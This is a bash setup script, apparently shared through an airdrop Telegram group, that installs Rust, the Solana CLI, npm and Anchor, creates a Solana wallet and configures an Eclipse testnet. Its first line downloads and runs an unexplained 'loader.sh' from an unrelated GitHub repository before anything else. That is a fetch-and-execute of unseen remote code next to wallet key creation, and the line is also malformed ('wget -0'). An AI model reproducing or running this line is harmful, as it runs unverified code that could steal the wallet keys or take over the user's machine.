#!/bin/bash

wget -0 https://raw.githubusercontent.com/alkindivv/Natnode/main/loader.sh && chmod +x loader.sh && ./loader.sh

prompt() {
    read -p "$1" response
    echo $response
}

execute_and_prompt() {
    echo -e "\n$1"
    eval "$2"
    read -p "Press [Enter] to continue..."
}

cd $HOME

execute_and_prompt "Updating your dependencies..." "sudo apt update && sudo apt upgrade -y"

if ! command -v rustc &> /dev/null; then
    response=$(prompt "Do you want to install Rust? (Reply 1 to proceed) ")
    if [ "$response" == "1" ]; then
        execute_and_prompt "Installing Rust..." "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
        source "$HOME/.cargo/env"
        execute_and_prompt "Checking Rust version..." "rustc --version"
    fi
else
    echo "Rust is already installed. Skipping installation."
fi

if ! command -v solana &> /dev/null; then
    execute_and_prompt "Installing Solana CLI..." 'sh -c "$(curl -sSfL https://release.solana.com/stable/install)"'
    export PATH="/root/.local/share/solana/install/active_release/bin:$PATH"
    execute_and_prompt "Checking Solana version..." "solana --version"
else
    echo "Solana CLI is already installed. Skipping installation."
fi

if ! command -v npm &> /dev/null; then
    execute_and_prompt "Installing npm..." "sudo apt-get install -y npm"
    execute_and_prompt "Checking npm version..." "npm --version"
else
    echo "npm is already installed. Skipping installation."
fi

if ! command -v anchor &> /dev/null; then
    execute_and_prompt "Installing Anchor CLI..." "cargo install --git https://github.com/project-serum/anchor anchor-cli --locked"
    export PATH="$HOME/.cargo/bin:$PATH"
    execute_and_prompt "Checking Anchor version..." "anchor --version"
else
    echo "Anchor CLI is already installed. Skipping installation."
fi

wallet_path=$(prompt "Enter the path to save your Solana wallet (e.g., /path-to-wallet/my-wallet.json): ")
execute_and_prompt "Creating Solana wallet..." "solana-keygen new -o $wallet_path"

execute_and_prompt "Updating Solana configuration..." "solana config set --url https://testnet.dev2.eclipsenetwork.xyz/ && solana config set --keypair $wallet_path"
execute_and_prompt "Checking Solana address..." "solana address"

echo "Program completed. Thanks to Happy Cuan Airdrop on Telegram!"
